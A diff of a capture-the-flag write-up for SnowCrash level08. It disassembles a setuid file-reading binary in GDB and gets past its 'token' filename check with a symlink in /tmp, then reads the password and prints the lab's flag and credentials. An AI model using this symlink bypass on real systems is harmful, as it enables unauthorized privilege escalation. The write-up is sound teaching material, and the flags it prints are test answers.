@@ -1,80 +1,171 @@
 # level08
 
-- We log as 'level08'
+- We login as user level08.
+```
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
 
-- Two files are located inside the home directory of level08:
->`-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08`
->`-rw-------  1 flag08 flag08    26 Mar  5  2016 token`
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
 
-- The executable file has setuid & setgid bits permissions
-
-- We can see that the executable will be executed as `flag08` if we execute it being `level08`
-
-- Upon execution without arguments the executable prints:
->`./level08 [file to read]`
-
-- Upon execution with `token` as argument the executable prints:
->`You may not access 'token'`
-
-- We dissassemble it using gdb but the asm dump is bigger than the last one, let's use `ghidra` on kali to reverse this binary easily
-
-- After analysing the binary this is the main function in C provided by `ghidra`:
-```c
-int main(int argc,char **argv,char **envp)
-{
-  char *pcVar1;
-  int __fd;
-  size_t __n;
-  ssize_t sVar2;
-  int in_GS_OFFSET;
-  undefined4 *in_stack_00000008;
-  int fd;
-  int rc;
-  char buf [1024];
-  undefined local_414 [1024];
-  int local_14;
-  
-  local_14 = *(int *)(in_GS_OFFSET + 0x14);
-  if (argc == 1) {
-    printf("%s [file to read]\n",*in_stack_00000008);
-                    /* WARNING: Subroutine does not return */
-    exit(1);
-  }
-  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
-  if (pcVar1 != (char *)0x0) {
-    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
-                    /* WARNING: Subroutine does not return */
-    exit(1);
-  }
-  __fd = open((char *)in_stack_00000008[1],0);
-  if (__fd == -1) {
-    err(1,"Unable to open %s",in_stack_00000008[1]);
-  }
-  __n = read(__fd,local_414,0x400);
-  if (__n == 0xffffffff) {
-    err(1,"Unable to read fd %d",__fd);
-  }
-  sVar2 = write(1,local_414,__n);
-  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
-                    /* WARNING: Subroutine does not return */
-    __stack_chk_fail();
-  }
-  return sVar2;
-}
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
 ```
 
-- We can see that the binary check if the file passed as arguments contains an occurence of `token` if not, it open the file, read it and print it on stdout
 
-- We can't rename `token` so let's create a symbolic link to `token` in `tmp`:
->`ln -s /home/user/level08/token /tmp/pwn08`
->`level08@SnowCrash:~$ ./level08 /tmp/pwn08`
->`quif5eloekouj29ke0vouxean`
+- A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
+```
+level07@SnowCrash:~$ gdb ./level08
+...
+(gdb) info functions
+All defined functions:
 
-- We can log to `flag08` with this password:
->`level08@SnowCrash:~$ su flag08`
->`Password: `
->`Don't forget to launch getflag !`
->`flag08@SnowCrash:~$ getflag`
->`Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f`
+File level08.c:
+int main(int, char **, char **);
 
-- We get the flag: `25749xKZ8L7DkSCwJkT9dyv6f`
+Non-debugging symbols:
+0x080483b4  _init
+...
+```
+```
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048554 <+0>:     push   %ebp
+   0x08048555 <+1>:     mov    %esp,%ebp
+   0x08048557 <+3>:     and    $0xfffffff0,%esp
+   0x0804855a <+6>:     sub    $0x430,%esp
+   0x08048560 <+12>:    mov    0xc(%ebp),%eax
+   0x08048563 <+15>:    mov    %eax,0x1c(%esp)
+   0x08048567 <+19>:    mov    0x10(%ebp),%eax
+   0x0804856a <+22>:    mov    %eax,0x18(%esp)
+   0x0804856e <+26>:    mov    %gs:0x14,%eax
+   0x08048574 <+32>:    mov    %eax,0x42c(%esp)
+   0x0804857b <+39>:    xor    %eax,%eax
+   0x0804857d <+41>:    cmpl   $0x1,0x8(%ebp)
+   0x08048581 <+45>:    jne    0x80485a6 <main+82>
+   0x08048583 <+47>:    mov    0x1c(%esp),%eax
+   0x08048587 <+51>:    mov    (%eax),%edx
+   0x08048589 <+53>:    mov    $0x8048780,%eax
+   0x0804858e <+58>:    mov    %edx,0x4(%esp)
+   0x08048592 <+62>:    mov    %eax,(%esp)
+   0x08048595 <+65>:    call   0x8048420 <printf@plt>
+   0x0804859a <+70>:    movl   $0x1,(%esp)
+   0x080485a1 <+77>:    call   0x8048460 <exit@plt>
+   0x080485a6 <+82>:    mov    0x1c(%esp),%eax
+   0x080485aa <+86>:    add    $0x4,%eax
+   0x080485ad <+89>:    mov    (%eax),%eax
+   0x080485af <+91>:    movl   $0x8048793,0x4(%esp)
+   0x080485b7 <+99>:    mov    %eax,(%esp)
+   0x080485ba <+102>:   call   0x8048400 <strstr@plt>
+   0x080485bf <+107>:   test   %eax,%eax
+   0x080485c1 <+109>:   je     0x80485e9 <main+149>
+   0x080485c3 <+111>:   mov    0x1c(%esp),%eax
+   0x080485c7 <+115>:   add    $0x4,%eax
+   0x080485ca <+118>:   mov    (%eax),%edx
+   0x080485cc <+120>:   mov    $0x8048799,%eax
+   0x080485d1 <+125>:   mov    %edx,0x4(%esp)
+   0x080485d5 <+129>:   mov    %eax,(%esp)
+   0x080485d8 <+132>:   call   0x8048420 <printf@plt>
+   0x080485dd <+137>:   movl   $0x1,(%esp)
+   0x080485e4 <+144>:   call   0x8048460 <exit@plt>
+   0x080485e9 <+149>:   mov    0x1c(%esp),%eax
+   0x080485ed <+153>:   add    $0x4,%eax
+   0x080485f0 <+156>:   mov    (%eax),%eax
+   0x080485f2 <+158>:   movl   $0x0,0x4(%esp)
+   0x080485fa <+166>:   mov    %eax,(%esp)
+   0x080485fd <+169>:   call   0x8048470 <open@plt>
+   0x08048602 <+174>:   mov    %eax,0x24(%esp)
+   0x08048606 <+178>:   cmpl   $0xffffffff,0x24(%esp)
+   0x0804860b <+183>:   jne    0x804862e <main+218>
+   0x0804860d <+185>:   mov    0x1c(%esp),%eax
+   0x08048611 <+189>:   add    $0x4,%eax
+   0x08048614 <+192>:   mov    (%eax),%eax
+   0x08048616 <+194>:   mov    %eax,0x8(%esp)
+   0x0804861a <+198>:   movl   $0x80487b2,0x4(%esp)
+   0x08048622 <+206>:   movl   $0x1,(%esp)
+   0x08048629 <+213>:   call   0x8048440 <err@plt>
+   0x0804862e <+218>:   movl   $0x400,0x8(%esp)
+   0x08048636 <+226>:   lea    0x2c(%esp),%eax
+   0x0804863a <+230>:   mov    %eax,0x4(%esp)
+   0x0804863e <+234>:   mov    0x24(%esp),%eax
+   0x08048642 <+238>:   mov    %eax,(%esp)
+   0x08048645 <+241>:   call   0x8048410 <read@plt>
+   0x0804864a <+246>:   mov    %eax,0x28(%esp)
+   0x0804864e <+250>:   cmpl   $0xffffffff,0x28(%esp)
+   0x08048653 <+255>:   jne    0x8048671 <main+285>
+   0x08048655 <+257>:   mov    0x24(%esp),%eax
+   0x08048659 <+261>:   mov    %eax,0x8(%esp)
+   0x0804865d <+265>:   movl   $0x80487c4,0x4(%esp)
+   0x08048665 <+273>:   movl   $0x1,(%esp)
+   0x0804866c <+280>:   call   0x8048440 <err@plt>
+   0x08048671 <+285>:   mov    0x28(%esp),%eax
+   0x08048675 <+289>:   mov    %eax,0x8(%esp)
+   0x08048679 <+293>:   lea    0x2c(%esp),%eax
+   0x0804867d <+297>:   mov    %eax,0x4(%esp)
+   0x08048681 <+301>:   movl   $0x1,(%esp)
+   0x08048688 <+308>:   call   0x8048490 <write@plt>
+   0x0804868d <+313>:   mov    0x42c(%esp),%edx
+   0x08048694 <+320>:   xor    %gs:0x14,%edx
+   0x0804869b <+327>:   je     0x80486a2 <main+334>
+   0x0804869d <+329>:   call   0x8048430 <__stack_chk_fail@plt>
+   0x080486a2 <+334>:   leave
+   0x080486a3 <+335>:   ret
+End of assembler dump.
+```
+
+
+- We can see that after moving certain values onto the stack the program compares the constant `0x1` with the value located at `0x8(%ebp)`. If this comparison results in equality, the program will call `<printf@plt>` with the value contained in memory address `0x8048799`, and then `<exit@plt>`.
+```
+(gdb) x/s 0x8048780
+0x8048780:       "%s [file to read]\n"
+```
+
+
+- It can be assumed that this binary results from a program written in C. The latter compares `argc` to the constant `0x1`, so `if argc == 1` (if the program was launched without arguments), it displays `./level08 [file to read]` and exits.
+
+
+- Then, we can see that `<strstr@plt>` is called to search within the string located in the `eax` register for the string that starts at address `0x8048793`.
+```
+(gdb) x/s 0x8048793
+0x8048793:       "token"
+```
+
+
+- Thus, if the string `token` is found within the string contained in the `eax` register (likely the first parameter given to the program), it will `<printf@plt>` the string that starts at address `0x8048799`, and then `<exit@plt>`. Otherwise, the program will call `<open@plt>`, followed by `<read@plt>` and `<write@plt>`.
+```
+(gdb) x/s 0x8048799
+0x8048799:       "You may not access '%s'\n"
+```
+
+
+- Let's see:
+```
+level08@SnowCrash:~$ echo test > /tmp/exploit
+level08@SnowCrash:~$ ./level08 /tmp/exploit
+test
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+```
+
+
+- So, the program checks its first parameter, if it contains the string `token`, `You may not access 'token'`, then `<exit@plt>` is displayed.
+Otherwise, it will attempt to open a file named with the value of its first parameter and will `<write@plt>` the contents of that file to the standard output with. Thus:
+```
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
+level08@SnowCrash:~$ ./level08 /tmp/exploit
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password:quif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+flag08@SnowCrash:~$ su level09
+Password:25749xKZ8L7DkSCwJkT9dyv6f
+level09@SnowCrash:~$
+```
